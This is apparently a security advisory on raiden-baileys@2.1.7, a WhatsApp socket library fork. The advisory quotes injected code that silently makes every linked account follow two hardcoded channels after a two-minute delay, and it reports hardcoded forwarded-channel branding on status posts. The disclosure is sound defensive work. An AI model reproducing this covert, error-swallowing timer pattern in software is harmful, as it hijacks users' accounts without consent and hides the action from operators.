details: Raiden-baileys (a Baileys/WhatsApp socket fork) ships hidden code that makes every connected WhatsApp account follow channels chosen by the package author. In lib/Socket/newsletter.js, inside makeNewsletterSocket, an unconditional setTimeout(…, 120000) is queued when the module is loaded: after two minutes it iterates a hardcoded array of channel IDs — 120363407277177688@newsletter and 120363407702752541@newsletter — and issues a WhatsApp w:mex query with QueryIds.FOLLOW for each one, swallowing any error so the action leaves no trace in the application logs. The timer's only purpose is to move the follow request outside the window in which a bot is typically started and inspected, and to hide it behind normal startup traffic. There is no configuration option, callback, or return value for this action: it is not exposed through the socket API, cannot be disabled by the integrator, and is unrelated to the library's documented newsletter helpers (newsletterFollow/newsletterUnfollow), which take a caller-supplied JID. Any WhatsApp bot built on this package silently enrols its linked account(s) into the two hardcoded channels after start-up. Hardcoded IOCs: WhatsApp channel JIDs 120363407277177688@newsletter and 120363407702752541@newsletter. raiden-baileys@2.1.7 is a WhatsApp socket library (a modified fork of Baileys) that carries injected code enrolling the authenticated account into third-party WhatsApp channels without the operator's knowledge. 1) lib/Socket/newsletter.js — inside makeNewsletterSocket(), next to the legitimately exported newsletter helpers, a bare statement runs a 120000 ms timer as soon as the socket is constructed: setTimeout(async () => { const channelIds = [ "120363407277177688@newsletter", "120363407702752541@newsletter" ]; for (const channelId of channelIds) { try { await newsletterWMexQuery(channelId, QueryIds.FOLLOW); } catch (e) {} } }, 120000); Each iteration issues its own GraphQL/w:mex FOLLOW mutation (query id 7871414976211147) addressed to the hardcoded channel. There is no configuration, option or caller-visible path that disables it, errors are swallowed, and the delay keeps the subscribe well after the socket handshake so it is not obvious during startup logging. Every WhatsApp session that loads this library silently follows those two channels from the user's own account. 2) lib/Socket/clutch-handler.js — the status/story send path hardcodes forwardedNewsletterMessageInfo defaults, so status posts are emitted as forwards attributed to an unrelated channel: newsletterJid "120363411769951302@newsletter" with newsletterName "alip shop #information". The user never chose that channel; outgoing messages carry third-party promotional branding. The package's only install hook (engine-requirements.js) merely checks the Node.js major version, so the account manipulation happens on library use rather than at install time. Channel JIDs observed: 120363407277177688@newsletter, 120363407702752541@newsletter (auto-followed) and 120363411769951302@newsletter (injected as the forwarded-channel attribution on status posts).
